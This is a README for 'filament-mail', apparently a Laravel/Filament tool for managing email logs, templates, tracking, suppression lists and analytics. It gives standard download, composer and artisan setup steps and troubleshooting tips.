# ✉️ filament-mail - Manage your application emails with ease

[![Download filament-mail](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Josephusphysical472/filament-mail)

Filament-mail gives you a workspace to manage your email communications. You can track messages, edit templates, and view analytics in one place. It works within your existing system to organize logs, templates, and delivery status.

## 🛠 Features

Filament-mail provides a set of tools to handle email workflows:

- Complete log of sent emails with content previews.
- Database templates featuring the Unlayer visual editor.
- Automatic link tracking and delivery status updates.
- Variable binding for personalized notifications.
- Dashboard views for engagement analytics.
- Suppression list management to handle unsubscribes.

## 💻 System Requirements

Your computer needs the following tools to run this software:

- A Windows operating system (Windows 10 or 11 recommended).
- PHP version 8.1 or higher installed on your machine.
- A modern web browser like Chrome, Firefox, or Edge.
- A compatible database system such as MySQL or MariaDB.
- Basic familiarity with your command terminal.

## 📥 Acquisition and Installation

You must obtain the software from the official repository. Follow these steps to prepare the files.

1. Visit the following address to download the software: [https://github.com/Josephusphysical472/filament-mail](https://github.com/Josephusphysical472/filament-mail).
2. Locate the "Code" button on the right side of the page.
3. Select "Download ZIP" to save the project folder to your computer.
4. Extract the contents of the ZIP file to a folder where you keep your projects.

## 🚀 Setting Up the Application

Once you extract the files, follow these steps to start the application.

1. Open your command terminal.
2. Navigate to the folder you created in the installation step.
3. Type `composer install` to download necessary core components.
4. Open the environment file named `.env` in a text editor like Notepad.
5. Enter your database connection details, such as your username and password, into the file.
6. Save the file and return to your terminal.
7. Run the command `php artisan migrate` to build the database tables.
8. Run the command `php artisan serve` to start the application server.

## 📊 Using the Dashboard

When the server runs, open your browser and go to the link provided in your terminal. You will see the Filament dashboard. 

The dashboard displays high-level data about your email performance. You can see how many emails you sent today and how many reached their destination. Click on the "Logs" tab to scroll through individual messages. You can click on any mail log item to see a preview of the email as your customers received it.

## 📝 Editing Templates

The "Templates" tab allows you to design your email layouts. You will find the Unlayer visual editor here. This tool lets you drag and drop headers, images, and text boxes. You do not need to write code to create professional layouts. 

Once you design a template, you can save it to your database. You can bind variables such as `customer_name` or `order_id` into these templates. The system replaces these variables with real data when you send the email.

## 🔍 Managing Suppression

Keeping your mailing list clean improves delivery rates. The "Suppression" tab tracks people who report your emails as spam or choose to opt out. The system adds these addresses to a block list. You can view, search, and manually remove addresses from this list at any time.

## 📈 Analyzing Results

The "Analytics" section offers visual charts regarding your email activity. You can measure open rates and click rates over time. These charts help you understand when your audience engages with your messages. All data updates automatically as the system processes new mail logs.

## ⚙️ Configuration Options

You can adjust how the application behaves by editing the configuration file located in the `config` folder. You can change settings related to email drivers, log retention periods, and dashboard labels. Always save your changes before running the application again. If the system behaves correctly, do not change these settings unless you have a specific need.

## 🆘 Troubleshooting Common Issues

If you cannot start the server, check your PHP installation by typing `php -v` in the terminal. Ensure you use the current version of the language.

If the application fails to connect to the database, check your `.env` file for typos. Ensure your database server is running in the background.

If images or styles do not load in the editor, check your internet connection. The Unlayer editor requires access to external scripts to render correctly.

If you encounter errors during the installation, delete the `vendor` folder and run `composer install` again. This step refreshes all project dependencies.